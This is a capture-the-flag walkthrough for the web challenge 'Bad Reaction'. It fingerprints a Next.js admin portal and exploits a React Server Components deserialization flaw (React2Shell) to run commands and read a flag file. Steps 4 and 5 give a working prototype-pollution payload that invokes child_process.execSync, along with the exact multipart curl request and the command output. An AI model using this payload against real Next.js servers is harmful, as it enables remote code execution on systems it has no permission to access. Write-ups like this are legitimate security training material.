# Bad Reaction Walkthrough

Challenge: **Bad Reaction**  
Category: **very easy web**  
Target: `http://task.ctf.uz:11001/`  
Flag: `CTF.UZ{r34ct10n_70_3x3cu710n_0x7}`

## Summary

The target redirects from `task.ctf.uz` to a virtual host named `bad-reaction.ctf`. The public page exposes a staff link to `app.bad-reaction.ctf`, which runs a Next.js admin login page.

The login form itself is not the intended attack path. The application is vulnerable to a React Server Components deserialization bug, commonly known as React2Shell. By sending a crafted React Flight / RSC payload with a `Next-Action` header, we can execute a command on the server and read `/app/flag.txt`.

## 1. Initial Request

Start with the given URL:

```bash
curl -i --max-time 10 http://task.ctf.uz:11001/
```

The response is a redirect:

```http
HTTP/1.1 301 Moved Permanently
Location: http://bad-reaction.ctf:11001/
```

Resolve the target IP:

```bash
getent hosts task.ctf.uz
```

Result:

```text
185.8.213.28 task.ctf.uz
```

Instead of editing `/etc/hosts`, use `curl --resolve`:

```bash
curl -i --max-time 10 \
  --resolve bad-reaction.ctf:11001:185.8.213.28 \
  http://bad-reaction.ctf:11001/
```

The page contains a hidden-ish staff link:

```html
<a href="http://app.bad-reaction.ctf:11001">Admin Portal</a>
```

## 2. Admin Portal

Request the admin virtual host:

```bash
curl -i --max-time 10 \
  --resolve app.bad-reaction.ctf:11001:185.8.213.28 \
  http://app.bad-reaction.ctf:11001/
```

The response is a Next.js application:

```http
X-Powered-By: Next.js
```

The page loads this client chunk:

```text
/_next/static/chunks/app/page-1f30b2e70dac68ca.js
```

Inspecting it shows that the form always posts to `/api/login`, then displays a generic invalid message:

```js
await fetch("/api/login", {
  method: "POST",
  headers: {"Content-Type":"application/json"},
  body: JSON.stringify({username:e,password:s})
})
```

Testing login gives only a generic 401:

```bash
curl -i --max-time 10 \
  --resolve app.bad-reaction.ctf:11001:185.8.213.28 \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":"test"}' \
  http://app.bad-reaction.ctf:11001/api/login
```

Response:

```json
{"error":"Invalid username or password"}
```

At this point, brute forcing credentials is not attractive. The challenge title, **Bad Reaction**, and the Next.js/RSC surface point toward a React Server Components issue.

## 3. Confirming RSC Behavior

Next.js App Router exposes React Server Components responses with the `RSC: 1` header:

```bash
curl -i --max-time 10 \
  --resolve app.bad-reaction.ctf:11001:185.8.213.28 \
  -H 'RSC: 1' \
  'http://app.bad-reaction.ctf:11001/?_rsc=1'
```

The server responds with:

```http
Content-Type: text/x-component
```

This confirms the app is using React Server Components / Flight protocol.

## 4. RCE Payload

Create the main payload:

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

Save it as `rsc_payload.json`.

Create the second small payload file:

```text
"$@0"
```

Save it as `rsc_payload2.txt`.

Send the exploit request:

```bash
curl -i --max-time 10 \
  --resolve app.bad-reaction.ctf:11001:185.8.213.28 \
  -X POST http://app.bad-reaction.ctf:11001/ \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Next-Action: 1' \
  -H 'X-Nextjs-Request-Id: abcd1234' \
  -H 'X-Nextjs-Html-Request-Id: abcd1234abcd1234' \
  -F '0=<rsc_payload.json' \
  -F '1=<rsc_payload2.txt' \
  -F '2=[]'
```

The server returns a React error containing the command output:

```text
1:E{"digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"}
```

This confirms command execution.

## 5. Finding the Flag

Change the command in `_prefix` to list useful directories:

```js
execSync('ls -la /app /home /tmp', {'timeout':5000})
```

The output shows:

```text
/app:
-r--r--r--    1 root     root            34 Dec 24 12:28 flag.txt
```

Now change the command to:

```js
execSync('cat /app/flag.txt', {'timeout':5000})
```

Send the same request again. The response contains:

```text
1:E{"digest":"CTF.UZ{r34ct10n_70_3x3cu710n_0x7}"}
```

## Flag

```text
CTF.UZ{r34ct10n_70_3x3cu710n_0x7}
```

## Lessons Learned

1. Virtual hosts matter in web CTFs.

   The initial domain redirected to `bad-reaction.ctf`, and the real app lived at `app.bad-reaction.ctf`. When DNS is missing, `curl --resolve` is cleaner than editing `/etc/hosts`:

   ```bash
   curl --resolve app.bad-reaction.ctf:11001:185.8.213.28 http://app.bad-reaction.ctf:11001/
   ```

2. Read the static frontend, but do not assume the form is the bug.

   The JavaScript showed only one endpoint, `/api/login`, and the response was intentionally generic. That was useful information: it suggested the intended route was likely framework-level, not credential guessing.

3. Framework fingerprints are exploitation hints.

   Headers like `X-Powered-By: Next.js`, files under `/_next/static/`, and `Content-Type: text/x-component` identify a Next.js App Router / RSC surface.

4. Challenge names often point at the bug class.

   “Bad Reaction” was a hint toward React. Combined with RSC behavior, this strongly suggested React2Shell-style deserialization.

5. Error messages can become exfiltration channels.

   The payload throws a `NEXT_REDIRECT` error and places command output in the `digest` field. Even though the HTTP status is `500`, the response body leaks the command result.

6. Start with harmless commands.

   Confirm execution with `id` first, then enumerate with `ls`, then read the flag. This keeps the exploit controlled and makes debugging easier.

7. Avoid unnecessary brute force.

   The login endpoint gave no signal and the frontend ignored the response body. Recognizing the framework vulnerability saved time compared with guessing passwords.

